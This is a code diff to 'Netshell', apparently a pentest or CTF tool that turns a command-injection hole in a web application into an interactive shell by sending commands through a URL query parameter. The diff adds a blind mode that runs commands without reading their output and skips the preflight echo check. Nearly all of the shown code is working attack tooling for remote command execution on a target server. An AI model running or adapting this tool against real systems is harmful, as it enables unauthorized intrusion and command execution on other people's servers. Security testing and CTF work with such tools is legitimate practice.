@@ -28,11 +28,15 @@ prefix = None
 suffix = None
 no_preflight = False
 no_history = False
+blind = False
 
 
-def voutput(message):
+def pinfo(message):
     if verbose:
         print(f'[i] {message}')
+        
+def palert(message):
+    print(f'[!] {message}')
 
 def random_string(length=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
@@ -55,9 +59,17 @@ def set_query_param(address: str, key: str, value: str) -> str:
     return urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))
     
 def send_command(command):
-    start_marker = f"--{random_string(8)}--"
-    end_marker = f"--{random_string(8)}--"
-    wrapped_command = f"echo {start_marker};{command};echo {end_marker}"
+    wrapped_command = command
+    start_marker = end_marker = None
+    
+    if not blind:
+        start_marker = f"--{random_string(8)}--"
+        end_marker = f"--{random_string(8)}--"
+        
+        start_marker_command = f"echo {start_marker};"
+        end_marker_command = f";echo {end_marker}"
+        
+        wrapped_command = f"{start_marker_command}{command}{end_marker_command}"
     
     if prefix:
         wrapped_command = f"{prefix}{wrapped_command}"
@@ -71,15 +83,19 @@ def send_command(command):
     url = set_query_param(address, parameter, QUERY_PLACEHOLDER)
     url = url.replace(QUERY_PLACEHOLDER, wrapped_command)
     
-    voutput(f"Sent command: {url}")
+    pinfo(f"Sent command: {url}")
     if len(url) > 2000:
         print(f"The URL length is very long: {len(url)} characters. Some servers may not process it correctly.")
     response = requests.get(url, cookies=cookies, headers={'User-Agent': user_agent} if user_agent else None)
-    voutput(f"Status code: {response.status_code}")
-    voutput(f"Response size: {len(response.text)}")
+    pinfo(f"Status code: {response.status_code}")
+    pinfo(f"Response size: {len(response.text)}")
     
     if response.status_code != 200:
-        print(f"[!] Command execution failed with status code: {response.status_code} and response: {response.text}")
+        palert(f"Command execution failed with status code: {response.status_code} and response: {response.text}")
+        return None
+    
+    if blind:
+        pinfo("Command sent in blind mode, no output will be returned.")
         return None
     
     unescaped_response = unescape(response.text)
@@ -87,15 +103,19 @@ def send_command(command):
 
 
 def preflight_request():
+    if blind:
+        pinfo("Blind mode enabled, skipping preflight checks.")
+        return True
+    
     preflight_random = random_string(16)
     preflight_echo = f"echo {preflight_random}"
     
     response = send_command(preflight_echo)
     if not response:
-        print("[!] Preflight request failed: No echo response received meaning the injection might not work properly.")
+        palert(f"Preflight request failed: No echo response received meaning the injection might not work properly. If this is a blind injection, consider using the --blind flag to disable output retrieval and avoid preflight checks.")
         return False
     if preflight_random not in response:
-        print("[!] Preflight request failed: Could not verify command output.")
+        palert(f"Preflight request failed: Could not verify command output.")
         return False
     return True
 
@@ -137,7 +157,7 @@ def command_save(command: str, content: str) -> bool:
 
 
 def main():
-    global address, parameter, url_encode, verbose, cookies, user_agent, prefix, suffix, no_preflight
+    global address, parameter, url_encode, verbose, cookies, user_agent, prefix, suffix, no_preflight, blind
     parser = argparse.ArgumentParser(description=f"Netshell v{VERSION} - A lightweight HTTP CLI Shell that enables custom command injections into vulnerable web applications with a familiar shell-like interface.")
     parser.add_argument("--address", "-a", help="Target address containing the full path. E.g., http://example.com/vulnerable.php")
     parser.add_argument("--parameter", "-p", help="Parameter name where the injection will occur. E.g., 'cmd' for http://example.com/vulnerable.php?cmd=...")
@@ -145,6 +165,7 @@ def main():
     parser.add_argument("--agent", help="Set a custom User-Agent header for the requests")
     parser.add_argument("--prefix", "-P", help="Set a custom prefix for the commands. This is usually the command escape. By default there is none.")
     parser.add_argument("--suffix", "-S", help="Set a custom suffix for the commands. This is usually the command escape. By default there is none.")
+    parser.add_argument("--blind", "-b", action="store_true", help="Enable blind command execution (no output returned)")
 
 
     parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
@@ -166,8 +187,9 @@ def main():
     user_agent = args.agent
     prefix = args.prefix
     suffix = args.suffix
-    no_preflight = args.no_preflight
+    blind = args.blind
     
+    no_preflight = args.no_preflight
     if not no_preflight:
         is_successful = preflight_request()
         if is_successful:
@@ -199,24 +221,31 @@ def main():
                 print("  !save <local_file_path> - Save the output of the last command to a local file on your machine. E.g., '!save output.txt'")
                 print("\nAuthor: Richard A. Dubniczky, https://dubniczky.com")
                 print("Source: https://github.com/dubniczky/Netshell")
+                output = ''
             elif command.lower().startswith('!flag'):
                 if not command_flag():
                     print("[!] There was an error while searching for flag files.")
+                output = ''
             elif command.lower().startswith('!save'):
                 if not output:
                     print("[!] No command output available to save.")
                     continue
                 command_save(command, output)
+                output = ''
             elif command.startswith('!'):
                 print(f"[!] Unknown Netshell command: {command}. Type '!help' for available commands.")
-
+                output = ''
             try:
                 output = send_command(command)
             except Exception as e:
                 print(f"[!] Error occurred while sending command: {e}")
                 continue
-
-            print(f"{output}")
+            if blind:
+                print("<Command executed without output.>")
+            elif output is not None:
+                print(f"{output}")
+            else:
+                print("<No output received or command execution failed.>")
     except KeyboardInterrupt:
         print("\nExiting shell.")
 
